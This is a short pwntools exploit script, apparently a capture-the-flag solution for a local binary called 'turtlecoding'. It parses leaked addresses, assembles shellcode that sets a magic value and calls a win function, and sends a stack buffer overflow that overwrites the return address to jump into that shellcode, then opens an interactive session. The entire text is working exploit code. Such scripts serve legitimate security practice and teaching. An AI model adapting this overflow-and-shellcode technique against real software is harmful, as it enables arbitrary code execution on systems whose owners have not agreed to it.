from pwn import *

context.arch = "amd64"

p = process("./turtlecoding")

def get_num():
    p.recvuntil(b":")
    num = int(p.recvline(keepends=False).strip().decode(), 16)
    return num

win = get_num()
inp = get_num()
magic = get_num()

shc = asm(f"mov rax, {win}\nmov rdi, 0x12345678\nmov dword ptr [{magic}], 0x13371337\ncall rax")
assert b"\n" not in shc

p.sendlineafter(b"enter input: ", shc)
p.sendlineafter(b"enter more input: ", b"A" * 0x58 + p64(inp))

p.interactive()
